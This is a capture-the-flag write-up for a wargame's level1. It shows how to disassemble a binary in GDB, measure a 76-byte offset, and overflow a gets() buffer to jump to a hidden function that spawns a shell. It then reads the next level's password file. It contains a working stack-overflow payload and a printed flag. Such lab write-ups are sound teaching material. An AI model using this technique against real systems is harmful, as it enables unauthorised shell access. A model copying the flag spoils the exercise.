# Level 1

## Connect to the virtual machine with SSH

Use the flag from `level0` as the `level1` password:

```bash
ssh level1@127.0.0.1 -p 2223
```

## Copy the binary to the host machine

From the root of this repository on the host:

```bash
scp -P 2223 level1@127.0.0.1:/home/user/level1/level1 ./level1/
```

The extracted binary is saved as `level1/level1`.

## Copy the GDB dump to the host

Inside the VM, connected as `level1`, open the binary with GDB:

```bash
gdb ./level1
```

Then enter:

```gdb
set disassembly-flavor intel
set pagination off
set logging file /tmp/level1_main_dump_gdb
set logging overwrite on
set logging on
disas main
disas run
set logging off
quit
```

Then copy the dump back from the host:

```bash
scp -P 2223 level1@127.0.0.1:/tmp/level1_main_dump_gdb ./level1/
```

Since the binary is already on the host, the same dump can also be generated
locally:

```bash
gdb -q -batch \
  -ex "set disassembly-flavor intel" \
  -ex "disassemble main" \
  -ex "disassemble run" \
  ./level1/level1 > ./level1/level1_main_dump_gdb
```

## Analyze the GDB dump

`main` only allocates a stack buffer and passes it to `gets`:

```asm
0x08048480 <+0>:  push   ebp
0x08048481 <+1>:  mov    ebp,esp
0x08048483 <+3>:  and    esp,0xfffffff0
0x08048486 <+6>:  sub    esp,0x50
0x08048489 <+9>:  lea    eax,[esp+0x10]
0x0804848d <+13>: mov    DWORD PTR [esp],eax
0x08048490 <+16>: call   0x8048340 <gets@plt>
0x08048495 <+21>: leave
0x08048496 <+22>: ret
```

`gets` is unsafe because it reads until a newline without checking the buffer
size. This lets us overwrite the saved return address.

There is also a hidden `run` function:

```asm
0x08048444 <+0>:  push   ebp
...
0x08048472 <+46>: mov    DWORD PTR [esp],0x8048584
0x08048479 <+53>: call   0x8048360 <system@plt>
```

The string at `0x8048584` is `/bin/sh`, so redirecting execution to `run`
spawns a shell.

Now we need to know exactly how many bytes are needed before overwriting the
saved return address.

At the start of `main`, the function creates its stack frame:

```asm
push   ebp
mov    ebp,esp
and    esp,0xfffffff0
sub    esp,0x50
```

Then it passes this address to `gets`:

```asm
lea    eax,[esp+0x10]
```

So the input buffer starts at `esp + 0x10`.

The saved return address is not stored at `esp + 0x50`. It is stored at
`ebp + 4`, because the standard function frame is:

```text
[saved return address]  <- ebp + 4
[saved old ebp]         <- ebp
[local stack space]     <- esp after sub esp,0x50
```

Because `main` aligns the stack with `and esp,0xfffffff0`, we should not guess
the exact distance from the disassembly alone. We can ask GDB for both
addresses after the stack frame has been created.

Set a breakpoint at `main+9`, which is the instruction right before `gets` uses
the buffer:

```gdb
break *main+9
run
p/x $ebp+4
p/x $esp+0x10
p/d ($ebp+4)-($esp+0x10)
```

Result:

```text
Breakpoint 1, 0x08048489 in main ()
$1 = 0xbffffc3c
$2 = 0xbffffbf0
$3 = 76
```

So:

```text
saved return address slot - buffer start = 0xbffffc3c - 0xbffffbf0 = 76
```

That means the first 76 bytes fill the buffer and everything between the buffer
and the saved return address. The next 4 bytes overwrite the saved return
address itself.

The payload layout is:

```text
76 bytes of padding       overwritten return address
AAAAAAAAAAAAAAAA...AAAA   44 84 04 08
```

`run` is at:

```text
0x08048444
```

On x86, addresses are written in little endian, so `0x08048444` becomes:

```text
\x44\x84\x04\x08
```

That is why the final payload starts with 76 bytes, then the address of `run`.

The terminal display is not a reliable way to count the `A` characters. For
example, payloads 76 bytes look almost identical when printed:

```bash
perl -e 'print "A" x 76 . "\x44\x84\x04\x08" . "\n"'
```

Use `wc -c` to count the real bytes:

```bash
perl -e 'print "A" x 76 . "\x44\x84\x04\x08" . "\n"' | wc -c
```

The command prints 81 bytes total:

```text
76 padding bytes + 4 address bytes + 1 newline = 81
```

Only the second one places the address exactly where the saved return address
starts.

## Exploitation

Run this in the VM:

```bash
(perl -e 'print "A" x 76 . "\x44\x84\x04\x08" . "\n"'; cat) | /home/user/level1/level1
```

The program prints:

```text
Good... Wait what?
```

The `cat` keeps stdin open for the shell started by `system("/bin/sh")`.
Check the effective identity:

```bash
whoami
```

Result:

```text
level2
```

Read the next password:

```bash
cat /home/user/level2/.pass
```

## Flag

```text
53a4a712787f40ec66c3c26c1f4b164dcad5552b038bb0addd69bf5bf6fa8e77
```
